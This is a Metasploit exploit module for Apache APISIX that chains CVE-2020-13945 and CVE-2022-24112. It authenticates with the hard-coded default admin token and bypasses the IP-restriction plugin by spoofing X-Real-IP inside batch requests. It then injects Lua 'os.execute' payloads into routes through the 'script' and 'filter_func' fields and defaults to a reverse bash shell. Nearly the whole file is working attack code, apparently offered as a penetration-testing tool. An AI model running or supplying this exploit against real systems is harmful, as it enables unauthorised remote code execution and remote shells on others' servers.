##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'APISIX Admin API default access token RCE',
        'Description' => %q{
          Apache APISIX has a default built-in API token edd1c9f034335f136f87ad84b625c8f1
          that can be used to access all the admin API, which leads to the
          remote LUA code execution through the script parameter added in the 2.x version.
          This module also leverages the another vulnerability to bypass the IP restriction
          plugin.
        },
        'Author' => [
          'Heyder Andrade <eu[at]heyderandrade.org>', # module development and debugging
          'YuanSheng Wang <membphis[at]gmail.com>' # discovered
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2020-13945'],
          ['CVE', '2022-24112'],
          ['URL', 'https://github.com/apache/apisix/pull/2244'],
          ['URL', 'https://seclists.org/oss-sec/2020/q4/187'],
          ['URL', 'https://www.openwall.com/lists/oss-security/2022/02/11/3']
        ],
        'DisclosureDate' => '2020-12-07',
        'Arch' => ARCH_CMD,
        'Platform' => %w[unix],
        'Targets' => [
          [
            'Automatic',
            { 'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' } }
          ]
        ],
        'Privileged' => false,
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [true, 'Path to the APISIX DocumentRoot', '/apisix']),
      OptString.new('API_KEY', [true, 'Admin API KEY (Default: edd1c9f034335f136f87ad84b625c8f1)', 'edd1c9f034335f136f87ad84b625c8f1']),
      OptString.new('ALLOWED_IP', [true, 'IP in the allowed list', '127.0.0.1'])
    ])
  end

  def check
    print_status("Checking component version to #{datastore['RHOST']}:#{datastore['RPORT']}")
    # perform an unautheticated request to a random path
    res = send_request_cgi({
      'uri' => normalize_uri(Rex::Text.rand_text_alpha_lower(6)), # random path
      'method' => 'GET'
    })

    unless res && res.headers.key?('Server')
      return Exploit::CheckCode::Safe('Seems not a APISIX server')
    end

    res.headers['Server'].match(%r{APISIX/(.*)$})
    version = Rex::Version.new(Regexp.last_match(1))
    vprint_status("Found an APISIX #{version}")
    unless version > Rex::Version.new('2')
      return Exploit::CheckCode::Safe('This version has not the script feature')
    end

    vprint_good('This version has the script feature')
    return Exploit::CheckCode::Appears('There is direct access to the routes using the provided token') if direct_access?

    vprint_status('There is no direct access to the routes. Trying to bypass restriction')
    pipeline = [
      {
        method: 'GET',
        path: "#{target_uri.path}/admin/routes"
      }
    ]
    res = batch_request(batch_body(pipeline))
    if res && res.code == 200
      return Exploit::CheckCode::Appears('Can bypass restriction using batch request')
    end

    return Exploit::CheckCode::Unknown
  end

  def exploit
    if direct_access?
      add_route
    else
      vprint_status 'Trying to bypass restriction'
      payload_uri = "/#{Rex::Text.rand_text_alpha_lower(3)}/#{Rex::Text.rand_text_alpha_lower(6)}"
      add_route_batch(payload_uri)
      # trigger the payload
      apisix_request({
        'uri' => normalize_uri(payload_uri),
        'method' => 'GET'
      })
    end
    handler
    clean_up(payload_uri) if payload_uri
  end

  # Using batch request to bypass ip-restricion policies (CVE-2022-24112)
  def batch_request(data = nil)
    params = {
      'uri' => normalize_uri(target_uri.path.to_s + '/batch-requests'),
      'method' => 'POST'
    }
    params.merge!({ 'data' => data }) if data

    apisix_request(params)
  end

  def batch_body(pipeline = [])
    headers = {
      'X-Real-IP': datastore['ALLOWED_IP'].to_s,
      'X-API-KEY' => datastore['API_KEY'].to_s,
      'Content-Type': 'application/json'
    }

    {
      headers: headers,
      timeout: 1500,
      pipeline: pipeline
    }.to_json
  end

  def base_data
    {
      'uri' => Rex::Text.rand_text_alpha_lower(6),
      'upstream' => {
        'type' => 'roundrobin',
        'nodes' => { "#{Rex::Text.rand_text_alpha_lower(6)}.#{Rex::Text.rand_text_alpha_lower(3)}": 1 }
      }
    }
  end

  def add_route
    # This method use the script parameter to execute the payload
    data = base_data.merge({
      'script' => "os.execute('PAYLOAD');".gsub!('PAYLOAD', payload.raw.to_s.gsub('\'') { '\\\"' })
    })
    params = {
      'uri' => normalize_uri("#{target_uri.path}/admin/routes"),
      'method' => 'POST'
    }

    params.merge!({ 'data' => JSON::dump(data) })

    apisix_request(params)
  end

  def add_route_batch(payload_uri)
    # This methos use the filter_func parameter to execute the payload
    data = base_data.merge({
      uri: payload_uri,
      name: Rex::Text.rand_text_alpha_lower(6),
      method: '[GET]',
      filter_func: "function(vars) os.execute('PAYLOAD'); return true end"
    }).to_json
    data.gsub!('PAYLOAD', payload.raw.to_s.gsub('\'') { '\\\"' })

    pipeline = [
      {
        method: 'PUT',
        path: "#{target_uri.path}/admin/routes/index",
        body: data
      }
    ]
    # add the route
    res = batch_request(batch_body(pipeline))
    fail_with(Failure::UnexpectedReply, 'Unable to create route') unless res.code == 200
  end

  def clean_up(route)
    data = base_data.merge({
      uri: route,
      method: '[GET]'
    }).to_json
    pipeline = [
      {
        method: 'DELETE',
        path: "#{target_uri.path}/admin/routes/index",
        body: data
      }
    ]
    # remove the route
    res = batch_request(batch_body(pipeline))
    fail_with(Failure::UnexpectedReply, 'Unable to delete the route') unless res.code == 200
  end

  def apisix_request(params = {})
    params.merge!({
      'ctype' => 'application/json',
      'headers' => {
        'X-API-KEY' => datastore['API_KEY'],
        'Accept' => '*/*',
        'Accept-Encoding' => 'gzip, deflate'
      }
    })

    send_request_cgi(params)
  end

  def direct_access?
    res = apisix_request({
      'uri' => normalize_uri("#{target_uri.path}/admin/routes"),
      'method' => 'GET'
    })
    res && res.code == 200
    # false # test
  end

end
